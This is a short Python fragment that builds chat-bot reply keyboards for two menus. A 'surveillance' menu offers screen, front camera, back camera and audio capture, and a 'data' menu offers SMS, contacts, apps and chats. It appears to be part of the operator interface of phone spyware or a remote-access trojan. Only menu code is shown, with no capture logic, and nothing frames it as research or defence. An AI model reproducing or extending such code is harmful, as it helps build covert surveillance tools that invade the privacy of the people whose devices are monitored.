    def _show_surveillance_menu(self):
        kb = {
            "keyboard": [
                [{"text": L_SCREEN}],
                [{"text": L_CAM_F}],
                [{"text": L_CAM_B}],
                [{"text": L_AUDIO}],
                [{"text": L_BACK}],
            ],
            "resize_keyboard": True,
        }
        self._send_markup(L_SURV, kb, html=True)

    def _show_data_menu(self):
        kb = {
            "keyboard": [
                [{"text": L_SMS}],
                [{"text": L_CONTACTS}],
                [{"text": L_APPS}],
                [{"text": L_CHATS}],
                [{"text": L_BACK}],
            ],
            "resize_keyboard": True,
        }
